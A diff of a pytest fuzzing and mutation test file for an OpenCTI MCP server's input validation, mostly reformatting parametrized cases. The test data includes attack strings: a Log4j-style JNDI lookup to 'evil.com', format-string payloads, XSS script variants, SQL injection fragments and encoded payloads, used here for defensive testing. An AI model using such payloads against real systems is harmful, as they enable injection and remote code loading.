@@ -12,20 +12,14 @@ from __future__ import annotations
 
 import random
 import string
-import struct
-import pytest
-from unittest.mock import MagicMock, patch
 
+import pytest
 from opencti_mcp.validation import (
-    validate_uuid,
-    validate_ioc,
-    validate_label,
-    validate_date_filter,
-    validate_pattern_type,
-    validate_stix_pattern,
-    validate_length,
-    sanitize_for_log,
     MAX_QUERY_LENGTH,
+    validate_date_filter,
+    validate_label,
+    validate_length,
+    validate_uuid,
 )
 
 
@@ -39,33 +33,36 @@ def validate_query(query: str) -> str:
 
 def sanitize_for_graphql(value: str) -> str:
     """Simple GraphQL sanitization - escape quotes."""
-    return value.replace('\\', '\\\\').replace('"', '\\"')
-from opencti_mcp.errors import ValidationError
-from opencti_mcp.server import OpenCTIMCPServer
-from opencti_mcp.config import Config, SecretStr
+    return value.replace("\\", "\\\\").replace('"', '\\"')
 
+
+from opencti_mcp.errors import ValidationError
 
 # =============================================================================
 # Byte-Level Mutation Tests
 # =============================================================================
 
+
 class TestByteLevelMutations:
     """Test byte-level input mutations."""
 
-    @pytest.mark.parametrize("mutation", [
-        b"\x00",  # Null byte
-        b"\xff",  # Max byte
-        b"\x01",  # SOH
-        b"\x02",  # STX
-        b"\x03",  # ETX
-        b"\x04",  # EOT
-        b"\x1b",  # Escape
-        b"\x7f",  # DEL
-        b"\x80",  # First non-ASCII
-        b"\xfe",  # Invalid UTF-8 start
-        b"\xff\xfe",  # BOM
-        b"\xef\xbb\xbf",  # UTF-8 BOM
-    ])
+    @pytest.mark.parametrize(
+        "mutation",
+        [
+            b"\x00",  # Null byte
+            b"\xff",  # Max byte
+            b"\x01",  # SOH
+            b"\x02",  # STX
+            b"\x03",  # ETX
+            b"\x04",  # EOT
+            b"\x1b",  # Escape
+            b"\x7f",  # DEL
+            b"\x80",  # First non-ASCII
+            b"\xfe",  # Invalid UTF-8 start
+            b"\xff\xfe",  # BOM
+            b"\xef\xbb\xbf",  # UTF-8 BOM
+        ],
+    )
     def test_binary_injection_in_query(self, mutation: bytes):
         """Binary bytes in query are handled safely."""
         try:
@@ -117,26 +114,30 @@ class TestByteLevelMutations:
 # Format String Attack Tests
 # =============================================================================
 
+
 class TestFormatStringAttacks:
     """Test format string vulnerability prevention."""
 
-    @pytest.mark.parametrize("payload", [
-        "%s%s%s%s%s",
-        "%x%x%x%x%x",
-        "%n%n%n%n%n",
-        "%d%d%d%d%d",
-        "%p%p%p%p%p",
-        "%.1000000d",
-        "%1$s",
-        "%99999$n",
-        "{0}{1}{2}",
-        "{__class__}",
-        "{.__class__.__mro__}",
-        "%(name)s",
-        "${{variable}}",
-        "${jndi:ldap://evil.com}",  # Log4j style
-        "${env:PATH}",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "%s%s%s%s%s",
+            "%x%x%x%x%x",
+            "%n%n%n%n%n",
+            "%d%d%d%d%d",
+            "%p%p%p%p%p",
+            "%.1000000d",
+            "%1$s",
+            "%99999$n",
+            "{0}{1}{2}",
+            "{__class__}",
+            "{.__class__.__mro__}",
+            "%(name)s",
+            "${{variable}}",
+            "${jndi:ldap://evil.com}",  # Log4j style
+            "${env:PATH}",
+        ],
+    )
     def test_format_string_in_query(self, payload: str):
         """Format strings don't cause issues."""
         # Should handle safely (store literally or reject)
@@ -147,11 +148,14 @@ class TestFormatStringAttacks:
         except ValidationError:
             pass  # Acceptable to reject
 
-    @pytest.mark.parametrize("payload", [
-        "%s%s%s",
-        "{name}",
-        "%(key)s",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "%s%s%s",
+            "{name}",
+            "%(key)s",
+        ],
+    )
     def test_format_string_in_label(self, payload: str):
         """Format strings in labels are handled."""
         try:
@@ -166,17 +170,21 @@ class TestFormatStringAttacks:
 # Encoding Variation Tests
 # =============================================================================
 
+
 class TestEncodingVariations:
     """Test different encoding attacks."""
 
-    @pytest.mark.parametrize("encoding,query", [
-        ("double_url", "test%2520query"),  # Double URL encode
-        ("html_entity", "test&#x3c;script&#x3e;"),  # HTML entities
-        ("unicode_escape", "test\\u003cscript\\u003e"),  # Unicode escape
-        ("base64_like", "dGVzdA=="),  # Base64
-        ("hex_encode", "\\x74\\x65\\x73\\x74"),  # Hex escapes
-        ("octal", "\\164\\145\\163\\164"),  # Octal escapes
-    ])
+    @pytest.mark.parametrize(
+        "encoding,query",
+        [
+            ("double_url", "test%2520query"),  # Double URL encode
+            ("html_entity", "test&#x3c;script&#x3e;"),  # HTML entities
+            ("unicode_escape", "test\\u003cscript\\u003e"),  # Unicode escape
+            ("base64_like", "dGVzdA=="),  # Base64
+            ("hex_encode", "\\x74\\x65\\x73\\x74"),  # Hex escapes
+            ("octal", "\\164\\145\\163\\164"),  # Octal escapes
+        ],
+    )
     def test_encoded_payloads(self, encoding: str, query: str):
         """Various encodings are handled safely."""
         # Should not decode and execute
@@ -187,12 +195,15 @@ class TestEncodingVariations:
         except ValidationError:
             pass
 
-    @pytest.mark.parametrize("char,variants", [
-        ("<", ["<", "%3c", "%3C", "&lt;", "&#60;", "&#x3c;", "\\u003c"]),
-        (">", [">", "%3e", "%3E", "&gt;", "&#62;", "&#x3e;", "\\u003e"]),
-        ("'", ["'", "%27", "&#39;", "&#x27;", "\\u0027"]),
-        ('"', ['"', "%22", "&quot;", "&#34;", "&#x22;", "\\u0022"]),
-    ])
+    @pytest.mark.parametrize(
+        "char,variants",
+        [
+            ("<", ["<", "%3c", "%3C", "&lt;", "&#60;", "&#x3c;", "\\u003c"]),
+            (">", [">", "%3e", "%3E", "&gt;", "&#62;", "&#x3e;", "\\u003e"]),
+            ("'", ["'", "%27", "&#39;", "&#x27;", "\\u0027"]),
+            ('"', ['"', "%22", "&quot;", "&#34;", "&#x22;", "\\u0022"]),
+        ],
+    )
     def test_dangerous_char_encodings(self, char: str, variants: list):
         """Dangerous chars in various encodings are handled."""
         for variant in variants:
@@ -210,6 +221,7 @@ class TestEncodingVariations:
 # =============================================================================
 # Boundary Mutation Tests
 # =============================================================================
+
 
 class TestBoundaryMutations:
     """Test boundary conditions with mutations."""
@@ -277,39 +289,46 @@ class TestBoundaryMutations:
 # Type Coercion Attack Tests
 # =============================================================================
 
+
 class TestTypeCoercionAttacks:
     """Test type coercion vulnerabilities."""
 
-    @pytest.mark.parametrize("value", [
-        "true",
-        "false",
-        "null",
-        "undefined",
-        "NaN",
-        "Infinity",
-        "-Infinity",
-        "0",
-        "1",
-        "-1",
-        "0x0",
-        "0o0",
-        "0b0",
-        "1e308",
-        "1e-308",
-    ])
+    @pytest.mark.parametrize(
+        "value",
+        [
+            "true",
+            "false",
+            "null",
+            "undefined",
+            "NaN",
+            "Infinity",
+            "-Infinity",
+            "0",
+            "1",
+            "-1",
+            "0x0",
+            "0o0",
+            "0b0",
+            "1e308",
+            "1e-308",
+        ],
+    )
     def test_js_special_values_in_query(self, value: str):
         """JavaScript special values don't cause issues."""
         result = validate_query(value)
         # Should be treated as literal strings
         assert result == value
 
-    @pytest.mark.parametrize("value", [
-        "[]",
-        "{}",
-        "[object Object]",
-        "function(){}",
-        "() => {}",
-    ])
+    @pytest.mark.parametrize(
+        "value",
+        [
+            "[]",
+            "{}",
+            "[object Object]",
+            "function(){}",
+            "() => {}",
+        ],
+    )
     def test_js_object_strings_in_query(self, value: str):
         """JavaScript object strings are handled."""
         try:
@@ -338,6 +357,7 @@ class TestTypeCoercionAttacks:
 # =============================================================================
 # Random Fuzzing Tests
 # =============================================================================
+
 
 class TestRandomFuzzing:
     """Random fuzzing tests."""
@@ -396,15 +416,19 @@ class TestRandomFuzzing:
 # Mutation Operator Tests
 # =============================================================================
 
+
 class TestMutationOperators:
     """Test with systematic mutation operators."""
 
-    @pytest.mark.parametrize("mutation_type", [
-        "delete_char",
-        "duplicate_char",
-        "insert_null",
-        "flip_case",
-    ])
+    @pytest.mark.parametrize(
+        "mutation_type",
+        [
+            "delete_char",
+            "duplicate_char",
+            "insert_null",
+            "flip_case",
+        ],
+    )
     def test_mutated_valid_uuid(self, mutation_type: str):
         """Mutated valid UUIDs are rejected or handled."""
         valid_uuid = "12345678-1234-1234-1234-123456789abc"
@@ -442,12 +466,15 @@ class TestMutationOperators:
         except ValidationError:
             pass  # Also acceptable if validation is stricter
 
-    @pytest.mark.parametrize("mutation_type", [
-        "replace_dash",
-        "wrong_position_dash",
-        "all_zeros",
-        "all_fs",
-    ])
+    @pytest.mark.parametrize(
+        "mutation_type",
+        [
+            "replace_dash",
+            "wrong_position_dash",
+            "all_zeros",
+            "all_fs",
+        ],
+    )
     def test_structurally_mutated_uuid(self, mutation_type: str):
         """Structurally mutated UUIDs are handled."""
         if mutation_type == "replace_dash":
@@ -470,6 +497,7 @@ class TestMutationOperators:
 # =============================================================================
 # Recursive Payload Tests
 # =============================================================================
+
 
 class TestRecursivePayloads:
     """Test recursive/nested payloads."""
@@ -511,18 +539,22 @@ class TestRecursivePayloads:
 # Polymorphic Attack Tests
 # =============================================================================
 
+
 class TestPolymorphicAttacks:
     """Test polymorphic attack variations."""
 
-    @pytest.mark.parametrize("variation", [
-        "<script>alert(1)</script>",
-        "<SCRIPT>alert(1)</SCRIPT>",
-        "<ScRiPt>alert(1)</sCrIpT>",
-        "<script >alert(1)</script >",
-        "<script\n>alert(1)</script>",
-        "<script\t>alert(1)</script>",
-        "< script>alert(1)</script>",
-    ])
+    @pytest.mark.parametrize(
+        "variation",
+        [
+            "<script>alert(1)</script>",
+            "<SCRIPT>alert(1)</SCRIPT>",
+            "<ScRiPt>alert(1)</sCrIpT>",
+            "<script >alert(1)</script >",
+            "<script\n>alert(1)</script>",
+            "<script\t>alert(1)</script>",
+            "< script>alert(1)</script>",
+        ],
+    )
     def test_xss_case_variations(self, variation: str):
         """XSS with case/whitespace variations are handled.
 
@@ -539,14 +571,17 @@ class TestPolymorphicAttacks:
         except ValidationError:
             pass  # Also acceptable
 
-    @pytest.mark.parametrize("variation", [
-        "union select",
-        "UNION SELECT",
-        "UnIoN SeLeCt",
-        "union/**/select",
-        "union\nselect",
-        "union\tselect",
-    ])
+    @pytest.mark.parametrize(
+        "variation",
+        [
+            "union select",
+            "UNION SELECT",
+            "UnIoN SeLeCt",
+            "union/**/select",
+            "union\nselect",
+            "union\tselect",
+        ],
+    )
     def test_sql_case_variations(self, variation: str):
         """SQL injection with variations are handled."""
         query = f"test {variation} * from users"
@@ -558,6 +593,7 @@ class TestPolymorphicAttacks:
 # =============================================================================
 # Async/Concurrent Mutation Tests
 # =============================================================================
+
 
 class TestConcurrentMutations:
     """Test validation under concurrent mutations."""
@@ -571,10 +607,7 @@ class TestConcurrentMutations:
             return validate_query(query)
 
         # Run many validations concurrently
-        tasks = [
-            validate_async(f"query{i}")
-            for i in range(100)
-        ]
+        tasks = [validate_async(f"query{i}") for i in range(100)]
         results = await asyncio.gather(*tasks)
         assert len(results) == 100
         assert all(r == f"query{i}" for i, r in enumerate(results))
